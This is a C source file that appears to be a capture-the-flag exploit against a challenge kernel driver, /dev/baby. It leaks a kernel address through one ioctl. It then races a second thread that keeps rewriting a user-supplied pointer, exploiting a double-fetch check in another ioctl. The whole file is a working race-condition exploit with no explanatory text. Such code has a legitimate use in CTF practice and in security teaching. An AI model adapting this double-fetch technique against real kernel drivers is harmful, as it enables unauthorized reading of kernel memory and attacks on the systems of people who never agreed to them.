#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x1000

char s[] =   "flag{AAAA_BBBB_CC_DDDD_EEEE_FFFF}";
//char s2[] = "flag{THIS_WILL_BE_YOUR_FLAG_1234}";

struct t{
	char * flag;
	size_t size; 
};


char* flagaddr=NULL;

int finish = 0;

void * run_thread(void * vvv)
{	
	struct t* v5 = vvv;
	while(!finish) {
		v5->flag = flagaddr;
	}	
	
}

int main(){
	
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);

	printf("{==DBG==} this is exp :p\n\n");

	int fd = open("/dev/baby",0);
	printf("{==DBG==} fd: %d\n",fd);
	int ret = ioctl(fd,0x6666);

	scanf("%px",&flagaddr);
	printf("{==DBG==} get addr: %p\n",flagaddr);

	struct t * v5 = (struct t * )malloc(sizeof(struct t));

	v5->size = 33;
	v5->flag = s;

	pthread_t t1;

	pthread_create(&t1, NULL, run_thread,v5);

	for(int i=0;i<TRYTIME;i++){
		ret = ioctl(fd, 0x1337, v5);
		if(ret != 0){
			//printf("{==DBG==} ret: %d\n",ret);
			printf("{==DBG==} addr: %p\n",v5->flag);
		}else{
			goto end;
		}
		v5->flag = s;
	}
end:
	finish = 1;

	pthread_join(t1, NULL);
	close(fd);

	return 0;
}
